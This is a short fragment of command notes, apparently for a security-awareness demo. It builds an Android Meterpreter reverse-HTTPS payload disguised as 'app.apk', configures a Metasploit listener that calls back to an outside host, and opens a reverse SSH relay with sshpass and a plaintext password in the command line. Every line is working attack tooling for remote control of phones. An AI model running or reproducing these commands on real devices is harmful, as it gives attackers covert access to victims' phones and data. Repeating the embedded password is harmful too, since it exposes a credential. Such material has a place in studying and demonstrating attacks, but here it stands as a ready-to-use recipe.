...
#msfvenom -p android/meterpreter/reverse_https LHOST=cyberawareness.de LPORT=443 > app.apk
...
set ReverseListenerBindPort 8888
set LHOST cyberawareness.de
set LPORT 443
set OverrideRequestHost true
set OverrideLHOST cyberawareness.de
...
# ssh relay
sshpass -p "kalijun15!" ssh -f -N -R 127.0.0.1:4444:127.0.0.1:8888 sshrelay@cyberawareness.de
